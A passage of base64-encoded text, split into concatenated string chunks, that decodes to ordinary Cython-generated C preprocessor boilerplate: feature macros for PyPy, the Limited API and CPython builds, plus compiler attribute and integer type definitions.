PCAweDAzMDkwMDAwCiAgICAjdW5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAwCiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUKQogICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMQogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMAogICN1bmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HCiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDAKICAjaWZuZGVmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRSAoUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMwQzAwKQogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX0FNX1NFTkQKICAjZGVmaW5lIENZVEhPTl9VU0VfQU1fU0VORCAwCiAgI3VuZGVmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICNkZWZpbmUgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAwCiAgI2lmbmRlZiBDWVRIT05fVVBEQVRFX0RF""U0NSSVBUT1JfRE9DCiAgICAjZGVmaW5lIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MgKFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMTEwMCkKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKICAjZGVmaW5lIENZVEhPTl9VU0VfRlJFRUxJU1RTIDAKI2VsaWYgZGVmaW5lZChDWVRIT05fTElNSVRFRF9BUEkpCiAgI2lmZGVmIFB5X0xJTUlURURfQVBJCiAgICAjdW5kZWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWAogICAgI2RlZmluZSBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIFB5X0xJTUlURURfQVBJCiAgI2VuZGlmCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgMQogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAwCiAgI3VuZGVmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0sKICAjZGVmaW5lIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0sgMAogICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDEKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMAogICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMAogICNpZm5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUgogICAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDAKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMgMAogICNpZm5kZWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMAogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDAKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAwCiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAwCiAgI3VuZGVmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICNk""ZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDAKICAjdW5kZWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMAogICN1bmRlZiBDWVRIT05fRkFTVF9HSUwKICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAwCiAgI3VuZGVmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwKQogICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTEwKICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAwCiAgI2lmbmRlZiBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MKICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVAogICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMAogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HCiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDAKICAjaWZuZGVmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRSAwCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX0FNX1NFTkQKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9BTV9TRU5EIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDApCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICNkZWZpbmUgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAwCiAgI2lmbmRlZiBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DCiAgICAjZGVmaW5lIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MgMAogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMAojZWxzZQogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAxCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgMAogICNpZmRlZiBQeV9HSUxfRElTQUJMRUQKICAgICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMQogICNlbHNlCiAgICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCiAgICAj""dW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxCiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTKQogICAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAwCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICAgI2RlZmluZSBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMgMQogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgI3VuZGVmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUwogICAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMAogICNlbGlmICFkZWZpbmVkKENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUykKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAxCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIHx8IFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwQTIKICAgICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMAogICNlbGlmICFkZWZpbmVkKENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIpCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMAogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgI3VuZGVmIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMKICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAxCiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUykKICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAwCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMQogICNlbmRpZgogICNp""Zm5kZWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDEKICAjZW5kaWYKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKICAgICN1bmRlZiBDWVRIT05fRkFTVF9HSUwKICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIDAKICAjZWxpZiAhZGVmaW5lZChDWVRIT05fRkFTVF9HSUwpCiAgICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE2KQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKICAgICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX0ZBU1RfUFlDQUxMCiAgICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MKICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVAogICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMAogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklORwogICAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEIxKQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VU0VfQU1fU0VORAogICAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgMQogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgI3VuZGVmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUwogICAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMAogICNlbGlmICFkZWZpbmVkKENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUykKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TICAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE1ICYmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURSkKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DCiAgICAjZGVmaW5lIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9O""X1VTRV9GUkVFTElTVFMKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgKCFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORykKICAjZW5kaWYKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX0ZBU1RfUFlDQ0FMTAojZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0NBTEwgIENZVEhPTl9GQVNUX1BZQ0FMTAojZW5kaWYKI2lmbmRlZiBDWVRIT05fVkVDVE9SQ0FMTAojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQojZGVmaW5lIENZVEhPTl9WRUNUT1JDQUxMICAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwKQojZWxzZQojZGVmaW5lIENZVEhPTl9WRUNUT1JDQUxMICAoQ1lUSE9OX0ZBU1RfUFlDQ0FMTCAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMEIxKQojZW5kaWYKI2VuZGlmCiNkZWZpbmUgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwgKENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDBCMSkKI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICN1bmRlZiBTSElGVAogICN1bmRlZiBCQVNFCiAgI3VuZGVmIE1BU0sKICAjaWZkZWYgU0laRU9GX1ZPSURfUAogICAgZW51bSB7IF9fcHl4X2NoZWNrX3NpemVvZl92b2lkcCA9IDEgLyAoaW50KShTSVpFT0ZfVk9JRF9QID09IHNpemVvZih2b2lkKikpIH07CiAgI2VuZGlmCiNlbmRpZgojaWZuZGVmIF9faGFzX2F0dHJpYnV0ZQogICNkZWZpbmUgX19oYXNfYXR0cmlidXRlKHgpIDAKI2VuZGlmCiNpZm5kZWYgX19oYXNfY3BwX2F0dHJpYnV0ZQogICNkZWZpbmUgX19oYXNfY3BwX2F0dHJpYnV0ZSh4KSAwCiNlbmRpZgojaWZuZGVmIENZVEhPTl9SRVNUUklDVAogICNpZiBkZWZpbmVkKF9fR05VQ19fKQogICAgI2RlZmluZSBDWVRIT05fUkVTVFJJQ1QgX19yZXN0cmljdF9fCiAgI2VsaWYgZGVmaW5lZChfTVNDX1ZFUikgJiYgX01TQ19WRVIgPj0gMTQwMAogICAgI2RlZmluZSBDWVRIT05fUkVTVFJJQ1QgX19yZXN0cmljdAogICNlbGlmIGRlZmluZWQgKF9fU1REQ19WRVJTSU9OX18pICYmIF9fU1REQ19WRVJTSU9OX18gPj0gMTk5OTAxTAogICAgI2RlZmluZSBDWVRIT05fUkVTVFJJQ1QgcmVzdHJpY3QKICAjZWxzZQogICAgI2RlZmluZSBDWVRIT05fUkVTVFJJQ1QKICAjZW5kaWYKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX1VOVVNFRAogICNpZiBkZWZpbmVkKF9fY3BsdXNwbHVzKQogICAgCiAgICAjaWYgKChkZWZpbmVkKF9NU1ZDX0xBTkcpICYmIF9NU1ZDX0xBTkcgPj0gMjAxNzAzTCkgfHwgX19jcGx1c3BsdXMgPj0gMjAxNzAzTCkKICAgICAgI2lmIF9faGFzX2NwcF9hdHRyaWJ1dGUobWF5YmVfdW51c2VkKQogICAgICAgICNkZWZpbmUgQ1lUSE9OX1VOVVNFRCBbW21heWJlX3VudXNlZF1dCiAgICAgICNlbmRpZgogICAgI2VuZGlmCiAgI2VuZGlmCiNlbmRpZgojaWZuZGVmIENZVEhPTl9VTlVTRUQKIyBpZiBkZWZpbmVkKF9fR05VQ19fKQojICAgaWYgIShkZWZpbmVk""KF9fY3BsdXNwbHVzKSkgfHwgKF9fR05VQ19fID4gMyB8fCAoX19HTlVDX18gPT0gMyAmJiBfX0dOVUNfTUlOT1JfXyA+PSA0KSkKIyAgICAgZGVmaW5lIENZVEhPTl9VTlVTRUQgX19hdHRyaWJ1dGVfXyAoKF9fdW51c2VkX18pKQojICAgZWxzZQojICAgICBkZWZpbmUgQ1lUSE9OX1VOVVNFRAojICAgZW5kaWYKIyBlbGlmIGRlZmluZWQoX19JQ0MpIHx8IChkZWZpbmVkKF9fSU5URUxfQ09NUElMRVIpICYmICFkZWZpbmVkKF9NU0NfVkVSKSkKIyAgIGRlZmluZSBDWVRIT05fVU5VU0VEIF9fYXR0cmlidXRlX18gKChfX3VudXNlZF9fKSkKIyBlbHNlCiMgICBkZWZpbmUgQ1lUSE9OX1VOVVNFRAojIGVuZGlmCiNlbmRpZgojaWZuZGVmIENZVEhPTl9VTlVTRURfVkFSCiMgIGlmIGRlZmluZWQoX19jcGx1c3BsdXMpCiAgICAgdGVtcGxhdGU8Y2xhc3MgVD4gdm9pZCBDWVRIT05fVU5VU0VEX1ZBUiggY29uc3QgVCYgKSB7IH0KIyAgZWxzZQojICAgIGRlZmluZSBDWVRIT05fVU5VU0VEX1ZBUih4KSAodm9pZCkoeCkKIyAgZW5kaWYKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIKICAjZGVmaW5lIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKHgpIENZVEhPTl9VTlVTRURfVkFSKHgpCiNlbmRpZgojaWZuZGVmIENZVEhPTl9OQ1BfVU5VU0VECiMgaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwojICBkZWZpbmUgQ1lUSE9OX05DUF9VTlVTRUQKIyBlbHNlCiMgIGRlZmluZSBDWVRIT05fTkNQX1VOVVNFRCBDWVRIT05fVU5VU0VECiMgZW5kaWYKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX1VTRV9DUFBfU1REX01PVkUKICAjaWYgZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFwKICAgIF9fY3BsdXNwbHVzID49IDIwMTEwM0wgfHwgKGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE2MDApKQogICAgI2RlZmluZSBDWVRIT05fVVNFX0NQUF9TVERfTU9WRSAxCiAgI2Vsc2UKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9DUFBfU1REX01PVkUgMAogICNlbmRpZgojZW5kaWYKI2RlZmluZSBfX1B5eF92b2lkX3RvX05vbmUodm9pZF9yZXN1bHQpICgodm9pZCkodm9pZF9yZXN1bHQpLCBQeV9JTkNSRUYoUHlfTm9uZSksIFB5X05vbmUpCiNpZmRlZiBfTVNDX1ZFUgogICAgI2lmbmRlZiBfTVNDX1NURElOVF9IXwogICAgICAgICNpZiBfTVNDX1ZFUiA8IDEzMDAKICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBjaGFyICAgICB1aW50OF90OwogICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIHNob3J0ICAgIHVpbnQxNl90OwogICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIGludCAgICAgIHVpbnQzMl90OwogICAgICAgICNlbHNlCiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgX19pbnQ4ICAgdWludDhfdDsKICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBfX2ludDE2ICB1aW50MTZfdDsKICAgICAgICAgICAgdHlwZWRlZiB1""bnNpZ25lZCBfX2ludDMyICB1aW50MzJfdDsKICAgICAgICAjZW5kaWYKICAgICNlbmRpZgogICAgI2lmIF9NU0NfVkVSIDwgMTMwMAogICAgICAgICNpZmRlZiBfV0lONjQKICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBsb25nIGxvbmcgIF9fcHl4X3VpbnRwdHJfdDsKICAgICAgICAjZWxzZQogICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIGludCAgICAgICAgX19weXhfdWludHB0cl90OwogICAgICAgICNlbmRpZgogICAgI2Vsc2UKICAgICAgICAjaWZkZWYgX1dJTjY0CiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgX19pbnQ2NCAgICBfX3B5eF91aW50cHRyX3Q7CiAgICAgICAgI2Vsc2UKICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBfX2ludDMyICAgIF9fcHl4X3VpbnRwdHJfdDsKICAgICAgICAjZW5kaWYKICAgICNlbmRpZgojZWxzZQogICAgI2luY2x1ZGUgPHN0ZGludC5oPgogICAgdHlwZWRlZiB1aW50cHRyX3QgIF9fcHl4X3VpbnRwdHJfdDsKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX0ZBTExUSFJPVUdICiAgI2lmIGRlZmluZWQoX19jcGx1c3BsdXMpCiAgICAKICAgICNpZiAoKGRlZmluZWQoX01TVkNfTEFORykgJiYgX01TVkNfTEFORyA+PSAyMDE3MDNMKSB8fCBfX2NwbHVzcGx1cyA+PSAyMDE3MDNMKQogICAgICAjaWYgX19oYXNfY3BwX2F0dHJpYnV0ZShmYWxsdGhyb3VnaCkKICAgICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSCBbW2ZhbGx0aHJvdWdoXV0KICAgICAgI2VuZGlmCiAgICAjZW5kaWYKICAgICNpZm5kZWYgQ1lUSE9OX0ZBTExUSFJPVUdICiAgICAgICNpZiBfX2hhc19jcHBfYXR0cmlidXRlKGNsYW5nOjpmYWxsdGhyb3VnaCkKICAgICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSCBbW2NsYW5nOjpmYWxsdGhyb3VnaF1dCiAgICAgICNlbGlmIF9faGFzX2NwcF9hdHRyaWJ1dGUoZ251OjpmYWxsdGhyb3VnaCkKICAgICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSCBbW2dudTo6ZmFsbHRocm91Z2hdXQogICAgICAjZW5kaWYKICAgICNlbmRpZgogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX0ZBTExUSFJPVUdICiAgICAjaWYgX19oYXNfYXR0cmlidXRlKGZhbGx0aHJvdWdoKQogICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSCBfX2F0dHJpYnV0ZV9fKChmYWxsdGhyb3VnaCkpCiAgICAjZWxzZQogICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSAogICAgI2VuZGlmCiAgI2VuZGlmCiAgI2lmIGRlZmluZWQoX19jbGFuZ19fKSAmJiBkZWZpbmVkKF9fYXBwbGVfYnVpbGRfdmVyc2lvbl9fKQogICAgI2lmIF9fYXBwbGVfYnVpbGRfdmVyc2lvbl9fIDwgNzAwMDAwMAogICAgICAjdW5kZWYgIENZVEhPTl9GQUxMVEhST1VHSAogICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSAogICAgI2VuZGlmCiAgI2VuZGlmCiNlbmRpZgojaWZuZGVmIFB5X1VOUkVBQ0hBQkxFCiAgI2RlZmluZSBQeV9VTlJFQUNIQUJMRSgpICBhc3NlcnQoMCk7IGFib3J0KCkK""I2VuZGlmCiNpZmRlZiBfX2NwbHVzcGx1cwogIHRlbXBsYXRlIDx0eXBlbmFtZSBUPgogIHN0cnVjdCBfX1BZWF9JU19VTlNJR05FRF9JTVBMIHtzdGF0aWMgY29uc3QgYm9vbCB2YWx1ZSA9IFQoMCkgPCBUKC0xKTt9OwogICNkZWZpbmUgX19QWVhfSVNfVU5TSUdORUQodHlwZSkgKF9fUFlYX0lTX1VOU0lHTkVEX0lNUEw8dHlwZT46OnZhbHVlKQojZWxzZQogICNkZWZpbmUgX19QWVhfSVNfVU5TSUdORUQodHlwZSkgKCgodHlwZSktMSkgPiAwKQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSA9PSAxCiAgI2RlZmluZSBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0ICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMCkKI2Vsc2UKICAjZGVmaW5lIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCAgKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjQgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwKQojZW5kaWYKI2RlZmluZSBfX1BZWF9SRUlOVEVSUFJFVF9GVU5DSU9OKGZ1bmNfcG9pbnRlciwgb3RoZXJfcG9pbnRlcikgKChmdW5jX3BvaW50ZXIpKHZvaWQoKikodm9pZCkpKG90aGVyX3BvaW50ZXIpKQoKCiNpZm5kZWYgQ1lUSE9OX0lOTElORQogICNpZiBkZWZpbmVkKF9fY2xhbmdfXykKICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORSBfX2lubGluZV9fIF9fYXR0cmlidXRlX18gKChfX3VudXNlZF9fKSkKICAjZWxpZiBkZWZpbmVkKF9fR05VQ